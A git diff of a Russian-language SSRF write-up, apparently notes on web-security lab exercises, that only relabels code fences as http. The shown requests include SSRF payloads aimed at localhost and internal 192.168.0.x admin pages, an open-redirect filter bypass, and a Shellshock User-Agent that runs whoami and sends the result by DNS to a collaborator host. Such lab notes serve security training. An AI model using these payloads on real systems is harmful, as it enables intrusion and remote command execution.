@@ -8,7 +8,7 @@
 
 Запрос к API для проверки наличия товара на складе:
 
-```
+```http
 POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
 
@@ -17,7 +17,7 @@ stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%
 
 В этой ситуации злоумышленник может изменить запрос, чтобы указать URL, локальный для самого сервера:
 
-```
+```http
 POST /product/stock HTTP/1.0 
 Content-Type: application/x-www-form-urlencoded 
 Content-Length: 118 
@@ -26,7 +26,7 @@ stockApi=http://localhost/admin
 
 ### SSRF на другие внутренние системы
 
-```
+```http
 POST /product/stock HTTP/1.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
@@ -60,7 +60,7 @@ stockApi=http://192.168.0.68/admin
 ### Обход фильтров SSRF через открытое перенаправление
 Есть функционал перехода на следующую страницу, которая содержит уязвимость `open redirection`, при которой URL:
 
-```
+```http
 GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080
 ```
 
@@ -72,7 +72,7 @@ http://192.168.0.12:8080
 
 Используем уязвимость для обхода фильтра URL и выполняем SSRF:
 
-```
+```http
 POST /product/stock HTTP/1.1
 Host: ac951fab1ffef84ac0f0709400cb00a1.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -87,7 +87,7 @@ stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
 
 Например, на сайте используется аналитическое программное обеспечение, которое получает URL, указанный в заголовке `Referer`, когда загружается страница продукта:
 
-```
+```http
 GET /product?productId=19 HTTP/1.1
 Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
 Referer: https://ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net/
@@ -95,7 +95,7 @@ Referer: https://ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net/
 
 Вызов запроса к серверу Burp Collaborator:
 
-```
+```http
 GET /product?productId=19 HTTP/1.1
 Host: ac7a1ffc1e47dae5c097263d00ee00b7.web-security-academy.net
 Referer: http://2wznfi7jzcg9hkmhurnhykpjfal69v.burpcollaborator.net
@@ -110,7 +110,7 @@ Shellshock payload:
 
 Пример запроса:
 
-```
+```http
 GET /product?productId=1 HTTP/1.1
 Host: ac901f3e1ea49cd3c054f7d2005b00d1.web-security-academy.net
 User-Agent: () { :;}; /usr/bin/nslookup $(whoami).6fmtccqu58psg7aj77qad8m9j0psdh.burpcollaborator.net
